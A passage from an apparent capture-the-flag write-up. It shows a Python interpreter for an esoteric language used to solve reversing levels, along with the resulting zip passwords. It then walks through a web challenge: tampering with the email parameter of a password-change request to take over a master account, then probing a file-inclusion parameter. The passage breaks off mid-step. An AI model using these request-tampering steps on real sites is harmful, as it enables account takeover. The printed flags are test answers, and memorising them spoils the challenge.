<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> eval_cond</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    cond </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> CondInstr</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]).</span><span style="color:#DBD7CAEE">eval</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">    ind </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">    while</span><span style="color:#DBD7CAEE"> ind </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        next_cond </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> CondInstr</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">]).</span><span style="color:#DBD7CAEE">eval</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">AND</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            cond </span><span style="color:#666666">&#x26;=</span><span style="color:#DBD7CAEE"> next_cond</span></span>
<span class="line"><span style="color:#4D9375">        elif</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">OR</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            cond </span><span style="color:#666666">|=</span><span style="color:#DBD7CAEE"> next_cond</span></span>
<span class="line"><span style="color:#4D9375">        else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            assert</span><span style="color:#4D9375"> False</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Unknown bitwise</span><span style="color:#C98A7D77">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">        ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 2</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> cond</span></span>
<span class="line"></span></code></pre>
<p>And we modify the <code>parse_line</code> function to consider the <code>BOH</code>s</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> parse_line</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    instr_ind </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#DBD7CAEE">    result </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"><span style="color:#4D9375">    while</span><span style="color:#DBD7CAEE"> instr_ind </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">BOH</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">            IF</span><span style="color:#666666"> =</span><span style="color:#666666"> []</span></span>
<span class="line"><span style="color:#DBD7CAEE">            instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">            while</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">|</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">                IF</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">                instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">            instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">            if_true </span><span style="color:#666666">=</span><span style="color:#666666"> []</span></span>
<span class="line"><span style="color:#4D9375">            while</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">OH</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> and</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">HOB</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                if_true</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">                instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">            if_false </span><span style="color:#666666">=</span><span style="color:#666666"> []</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">OH</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">                if_false</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">BOH</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span><span style="color:#758575DD">  # OH is no different from BOH</span></span>
<span class="line"><span style="color:#4D9375">                while</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">HO</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    if_false</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">                if_false</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">HOB</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">                instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">            assert</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">HOB</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">            instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> eval_cond</span><span style="color:#666666">(</span><span style="color:#C99076">IF</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">                result </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> parse_line</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">if_true</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">            else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">if_false</span><span style="color:#666666">)</span><span style="color:#CB7676"> ></span><span style="color:#4C9A91"> 2</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    result </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> parse_line</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">if_false</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">        else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            result </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> Instr</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]).</span><span style="color:#DBD7CAEE">eval</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">            instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> result</span></span>
<span class="line"></span></code></pre>
<p>password: <code>1936anok33ga16wu143102843phlqkkkmwcsw31821_31443137ps9ko3318ut93744299vsb571124022vbboc</code></p>
<h4 id="level-3">Level 3</h4>
<p>As expected this level introduces nested ifs. We prepared for this, so this level turned out to be really easy.</p>
<h4 id="third-interpreter">Third interpreter</h4>
<p>We just have to modify the <code>parse_line</code> function, in order to consider the nested <code>BOH</code>s</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> parse_line</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#C99076">    ...</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">BOH</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">            IF</span><span style="color:#666666"> =</span><span style="color:#666666"> []</span></span>
<span class="line"><span style="color:#DBD7CAEE">            instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">            while</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">|</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">                IF</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">                instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">            instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">            if_true </span><span style="color:#666666">=</span><span style="color:#666666"> []</span></span>
<span class="line"><span style="color:#DBD7CAEE">            boh_cnt </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#758575DD">  # If we encounter a BOH, we must encounter a HOB before considering to end the loop</span></span>
<span class="line"><span style="color:#4D9375">            while</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">OH</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> and</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">HOB</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> boh_cnt </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">BOH</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    boh_cnt </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">                elif</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">HOB</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    boh_cnt </span><span style="color:#666666">-=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">                if_true</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">                instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">            if_false </span><span style="color:#666666">=</span><span style="color:#666666"> []</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">OH</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">                if_false</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">BOH</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">                boh_cnt </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#758575DD">  # Same thing here</span></span>
<span class="line"><span style="color:#4D9375">                while</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">HO</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> boh_cnt </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                    if</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">BOH</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                        boh_cnt </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">                    elif</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">HOB</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                        boh_cnt </span><span style="color:#666666">-=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    if_false</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">                if_false</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">HOB</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">                instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">            assert</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">HOB</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">            instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> eval_cond</span><span style="color:#666666">(</span><span style="color:#C99076">IF</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">                result </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> parse_line</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">if_true</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">            else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">if_false</span><span style="color:#666666">)</span><span style="color:#CB7676"> ></span><span style="color:#4C9A91"> 2</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    result </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> parse_line</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">if_false</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C99076">        ...</span></span>
<span class="line"></span></code></pre>
<h4 id="level-4">Level 4</h4>
<p>The finish line is near, we see <code>flag.zip</code>!</p>
<p>This level introduces loops, the syntax is:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>LOOP {condition} | {instructions} POOL</span></span>
<span class="line"><span></span></span></code></pre>
<p>that translates to:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>while (condition) {</span></span>
<span class="line"><span>    instructions</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span></code></pre>
<p>This is almost identical to ifs, so we don’t have much work to do.</p>
<h4 id="final-interpreter">Final interpreter</h4>
<p>We get the condition and the instruction in the same way we got them with the <code>BOH</code> instruction, but instead of an if-else, we will have a while:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> parse_line</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#C99076">    ...</span></span>
<span class="line"><span style="color:#4D9375">        elif</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">LOOP</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">            IF</span><span style="color:#666666"> =</span><span style="color:#666666"> []</span></span>
<span class="line"><span style="color:#DBD7CAEE">            instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">            while</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">|</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">                IF</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">                instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">            instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">            loop_instr </span><span style="color:#666666">=</span><span style="color:#666666"> []</span></span>
<span class="line"><span style="color:#DBD7CAEE">            loop_cnt </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#4D9375">            while</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">POOL</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> loop_cnt </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">LOOP</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    loop_cnt </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">                elif</span><span style="color:#DBD7CAEE"> instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">POOL</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    loop_cnt </span><span style="color:#666666">-=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">                loop_instr</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">                instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">            while</span><span style="color:#DBD7CAEE"> eval_cond</span><span style="color:#666666">(</span><span style="color:#C99076">IF</span><span style="color:#666666">):</span><span style="color:#758575DD">  # This is the only significant difference</span></span>
<span class="line"><span style="color:#DBD7CAEE">                result </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> parse_line</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">loop_instr</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">            instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C99076">        ...</span></span>
<span class="line"></span></code></pre>
<p>And we finally get the <code>flag.zip</code> password and the 500 ( + 4 ) points.</p>
<p>password: <code>t5j494040404049t_vj492349z1212374623181838516h7j540y2m234489715y4216ka24-163177ce5n_mh1516</code></p>
<h2 id="web-45">Web (4/5)</h2>
<h3 id="web-100">Web 100</h3>
<p>The goal of this challenge is to be able to gain access to the master account. we can do this through the form to change password. After that we can access the flag exploiting a file inclusion vulnerability in the master page.</p>
<ol>
<li>
<p>First of all click on the door to access the challenge.</p>
</li>
<li>
<p>From the register page create a fake account for example:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Email:    fake@mail.com</span></span>
<span class="line"><span>Password: fakepassword</span></span>
<span class="line"><span></span></span></code></pre>
<p>Click on “I’m not a robot” and login with your creds.</p>
</li>
<li>
<p>Click on the spinning dice.
In the source page of “Main Menu” you can found and interesting variable used in the <code>executeCommand</code> function.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>var masterName = "master@4be3b0e9-a58d-4b53-8eb3-dcf3414877f1.com";</span></span>
<span class="line"><span></span></span></code></pre>
<p>We now have the master email.</p>
</li>
<li>
<p>Change master password:
From “Profile” page we can change our password by entering our credentials, but we can intercept the request with BurpSuite and change the <code>email</code> parameter with master’s email:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>email=fake@mail.com&#x26;old=fakepassword&#x26;new=newpassword</span></span>
<span class="line"><span></span></span></code></pre>
<p>Insert a generic password in the <code>new</code> parameter:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>email=master@4be3b0e9-a58d-4b53-8eb3-dcf3414877f1.com&#x26;old=fakepassword&#x26;new=newmasterpassword</span></span>
<span class="line"><span></span></span></code></pre>
<p>We forward the modified request and we have changed the master password!</p>
</li>
<li>
<p>Now login with master’s creds and access to master page.
From there we can select three files:</p>
<ul>
<li><code>campaign.txt</code></li>
<li><code>player1.txt</code></li>
<li><code>player2.txt</code></li>
</ul>
<p>We can analyze the request with BurpSuite clicking <code>Load</code> button and notice this body parameter:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>note=campaign.txt</span></span>
<span class="line"><span></span></span></code></pre>
<p>looks like a sort of file inclusion vulnerability. We can manipulate this parameter with Repeater function in BurpSuite (<code>ctrl+r</code> to send to the Repeater)</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>note=/</span></span>
<span class="line"><span></span></span></code></pre>
<p>with this parameter we are redirected to a page named troll… But in the source code of it there is an interesting comment:</p>
